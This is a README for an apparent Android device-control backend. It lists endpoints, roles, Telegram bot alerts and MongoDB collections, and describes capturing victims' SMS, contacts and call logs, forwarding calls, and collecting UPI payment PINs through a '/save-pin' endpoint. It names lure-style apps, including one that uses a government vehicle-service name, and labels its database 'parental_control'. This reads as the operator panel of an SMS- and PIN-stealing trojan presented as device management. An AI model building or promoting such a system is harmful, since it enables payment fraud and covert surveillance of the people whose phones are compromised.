# Device Management & Monitoring System

Complete device monitoring and management system with admin panel, real-time notifications, and comprehensive device control.

## ?? Features

- **Multi-Admin System** with role-based permissions (Super Admin, Admin, Viewer)
- **Single Session Control** - One active login per admin
- **Device Management** - Remote monitoring and control of Android devices
- **Real-time Notifications** - Telegram + Push notifications
- **SMS & Contacts Monitoring** - Full access to device communications
- **Call Management** - Call forwarding and call logs
- **UPI PIN Collection** - Secure UPI PIN capture
- **Admin Account Expiry** - Time-limited admin accounts
- **App Type Filtering** - Filter devices by application type
- **Two-Factor Authentication (2FA)** - OTP-based secure login

---

## ?? Documentation

Complete API documentation is available in the `/docs` directory:

- **[Admin API Documentation](./docs/ADMIN_API.md)** - All admin-related endpoints
- **[Device API Documentation](./docs/DEVICE_API.md)** - All device-related endpoints
- **[Authentication Guide](./docs/AUTHENTICATION.md)** - Login, 2FA, and security
- **[Firebase Setup Guide](./docs/FIREBASE.md)** - Firebase configuration for both devices and admins
- **[Admin Push Notifications](./docs/ADMIN_PUSH_NOTIFICATIONS.md)** - Complete FCM implementation guide
- **[Bot Authentication](./docs/BOT_AUTH.md)** - Telegram bot service tokens

---

## ?? Quick Start

### 1. Install Dependencies
```bash
pip install -r requirements.txt
```

### 2. Configure Environment
Create `.env` file:
```env
MONGODB_URL=mongodb://localhost:27017
DATABASE_NAME=parental_control
SECRET_KEY=your-secret-key-here
TELEGRAM_ENABLED=true
TELEGRAM_2FA_BOT_TOKEN=your-bot-token
TELEGRAM_2FA_CHAT_ID=your-chat-id
```

### 3. Setup Firebase
- Download service account JSON for devices: `device-firebase-adminsdk.json`
- Download service account JSON for admins: `admin-firebase-adminsdk.json`
- See [Firebase Setup Guide](./docs/FIREBASE.md) for details

### 4. Run Server
```bash
python run.py
```

Server will start on `http://localhost:8000`

---

## ?? Admin Roles & Permissions

### Super Admin
- Full system access
- Manage admins
- View all devices
- Access all features

### Admin
- Manage own devices
- Send commands
- View SMS & contacts
- Limited admin actions

### Viewer
- View-only access
- No device control
- Read-only permissions

---

## ?? Telegram Bot System

Each admin has **5 dedicated Telegram bots**:

1. **Bot 1** - Device Notifications (registration, UPI detection)
2. **Bot 2** - SMS Notifications (new messages)
3. **Bot 3** - Admin Activity (commands, status changes)
4. **Bot 4** - Login/Logout notifications
5. **Bot 5** - Reserved for future use

---

## ?? Supported Applications

- **SexyChat** (`sexychat`) - ?? Chat application
- **mParivahan** (`mparivahan`) - ?? Vehicle management
- **SexyHub** (`sexyhub`) - ?? Media application

---

## ??? Architecture

```
???????????????????????????????????????????????????????????????
?                     Backend Server (FastAPI)                 ?
???????????????????????????????????????????????????????????????
?                                                               ?
?  ?????????????????    ????????????????    ???????????????? ?
?  ?   Admin API   ?    ?  Device API  ?    ?  Auth API    ? ?
?  ?????????????????    ????????????????    ???????????????? ?
?          ?                   ?                    ?          ?
?          ??????????????????????????????????????????          ?
?                              ?                                ?
?                    ???????????????????                       ?
?                    ?    MongoDB      ?                       ?
?                    ???????????????????                       ?
?                                                               ?
???????????????????????????????????????????????????????????????
?                     External Services                         ?
???????????????????????????????????????????????????????????????
?                                                               ?
?  ????????????????  ????????????????  ????????????????      ?
?  ?   Telegram   ?  ?Firebase (Dev)?  ?Firebase (Adm)?      ?
?  ?   (5 Bots)   ?  ?  (Commands)  ?  ?  (Push Not.) ?      ?
?  ????????????????  ????????????????  ????????????????      ?
?                                                               ?
???????????????????????????????????????????????????????????????
```

---

## ?? Database Collections

- `admins` - Admin accounts and configurations
- `devices` - Registered devices and metadata
- `sms_messages` - SMS history
- `contacts` - Device contacts
- `call_logs` - Call history
- `device_logs` - Device activity logs
- `admin_activities` - Admin action logs
- `otp_codes` - 2FA verification codes

---

## ?? API Endpoints Summary

### Authentication
- `POST /auth/login` - Step 1: Username/password
- `POST /auth/verify-2fa` - Step 2: OTP verification
- `POST /auth/logout` - Logout

### Admin Management
- `POST /admin/create` - Create new admin
- `GET /admin/list` - List all admins
- `PUT /admin/{username}` - Update admin
- `DELETE /admin/{username}` - Delete admin
- `GET /api/admin/{username}/devices` - View admin's devices (Super Admin only)

### Device Management
- `POST /register` - Register new device
- `GET /api/devices` - List devices (with filtering)
- `GET /api/devices/{device_id}` - Get device details
- `GET /api/devices/app-types` - Get available app types
- `POST /api/devices/{device_id}/command` - Send command to device

### SMS & Contacts
- `GET /api/devices/{device_id}/sms` - Get SMS messages
- `GET /api/devices/{device_id}/contacts` - Get contacts
- `POST /sms-history` - Receive SMS history from device
- `POST /contacts` - Receive contacts from device

### UPI & Payments
- `POST /save-pin` - Save UPI PIN from payment page

### Bot Authentication
- `POST /bot/auth/request-otp` - Request OTP for bot
- `POST /bot/auth/verify-otp` - Verify OTP and get service token
- `GET /bot/auth/check` - Check admin status

For complete API documentation, see the `/docs` directory.

---

## ?? Security Features

- **JWT-based authentication** with session management
- **Two-Factor Authentication (2FA)** via Telegram
- **Single session control** - Only one active login per admin
- **Account expiry system** - Time-limited admin accounts
- **Service vs Interactive tokens** - Different token types for bots and web
- **Activity logging** - All admin actions are logged
- **Permission-based access control** - Fine-grained permissions

---

## ??? Technology Stack

- **Backend:** FastAPI (Python 3.10+)
- **Database:** MongoDB (Motor - async driver)
- **Notifications:** Telegram Bot API
- **Push Notifications:** Firebase Cloud Messaging (FCM)
- **Authentication:** JWT + 2FA
- **Real-time:** WebSocket support

---

## ?? Project Structure

```
app/
??? models/
?   ??? admin_schemas.py      # Admin models
?   ??? schemas.py             # Device models
?   ??? bot_schemas.py         # Bot authentication models
?   ??? otp_schemas.py         # OTP/2FA models
?   ??? upi_schemas.py         # UPI PIN models
??? services/
?   ??? auth_service.py        # Authentication logic
?   ??? device_service.py      # Device management
?   ??? firebase_service.py    # Device commands (Firebase)
?   ??? firebase_admin_service.py  # Admin notifications (Firebase)
?   ??? telegram_multi_service.py  # Multi-bot Telegram
?   ??? admin_activity_service.py  # Activity logging
?   ??? websocket_manager.py   # WebSocket connections
??? utils/
?   ??? auth_middleware.py     # Auth middleware & permissions
??? config.py                  # Configuration
??? database.py                # MongoDB connection
??? main.py                    # FastAPI application
```

---

## ?? Testing

### Run Tests
```bash
pytest tests/
```

### API Documentation
Once server is running, visit:
- **Swagger UI:** http://localhost:8000/docs
- **ReDoc:** http://localhost:8000/redoc

---

## ?? Development

### Code Style
- Python 3.10+
- Async/await patterns
- Type hints
- Pydantic models for validation

### Database Migrations
Migrations run automatically on server startup. Check `app/database.py` for details.

---

## ?? Support

For detailed API documentation and guides, see the `/docs` directory.

---

**Version:** 2.0.0  
**Last Updated:** November 2, 2025  
**License:** Proprietary
